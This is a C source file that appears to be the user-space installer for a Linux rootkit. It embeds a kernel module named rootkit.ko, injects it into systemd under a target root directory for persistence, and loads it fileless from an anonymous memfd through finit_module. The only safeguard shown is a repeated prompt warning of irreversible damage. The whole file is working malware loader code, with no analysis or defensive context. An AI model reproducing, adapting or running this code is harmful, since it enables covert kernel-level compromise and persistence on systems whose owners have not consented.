#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/module.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <syscall.h>
#include <unistd.h>
#include "../common.h"
#include "injector.h"

extern const char _binary_rootkit_ko_start[];
extern const char _binary_rootkit_ko_end[];

int main(int argc, char *argv[])
{
    char yes;
    if (argc != 2) {
        puts(WARN "Usage: ./user [path to root directory]");
        return -1;
    }
    for (int i = 0; i < 3; i++) {
        puts(WARN
             "THIS WILL POTENTIALLY CAUSE IRREVERSIBLE DAMAGE TO THE SYSTEM");
        printf("Do you still want to do it? [y/n]: ");
        scanf(" %c", &yes);
        if (yes != 'y' && yes != 'Y')
            return 0;
    }
    puts(INFO "Start injecting module into systemd...");
    install_module(_binary_rootkit_ko_start, _binary_rootkit_ko_end, argv[1]);

    puts(INFO "Start loading kernel module...");

    int fd = syscall(SYS_memfd_create, "file", MFD_CLOEXEC);
    if (fd == -1) {
        puts(WARN "memfd_create error");
        return -1;
    }
    write(fd, _binary_rootkit_ko_start,
          _binary_rootkit_ko_end - _binary_rootkit_ko_start);
    lseek(fd, 0, SEEK_SET);
    if (syscall(SYS_finit_module, fd, "", 0)) {
        puts(WARN "You are not root");
        return -1;
    }
    close(fd);
    return 0;
}
